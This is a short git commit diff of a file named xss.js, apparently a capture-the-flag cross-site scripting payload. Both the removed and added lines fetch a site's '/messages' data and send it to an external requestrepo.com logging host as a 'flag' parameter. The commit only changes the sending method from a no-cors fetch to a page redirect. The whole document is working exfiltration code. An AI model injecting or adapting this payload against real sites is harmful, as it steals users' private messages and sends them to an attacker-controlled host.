8d4b44032f1875d104cc22af16e8daabce6fdc2d
pop-rdi-ret <poprdiret@gmail.com>
2025-10-02 19:38:48 +0200

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,3 +1,3 @@
 fetch('/messages')
   .then(r => r.json())
-  .then(d => fetch('https://ntqibotq.requestrepo.com/log?flag=' + encodeURIComponent(JSON.stringify(d)), { mode: 'no-cors' }));
+  .then(d => window.location = 'https://ntqibotq.requestrepo.com/log?flag=' + encodeURIComponent(JSON.stringify(d)));
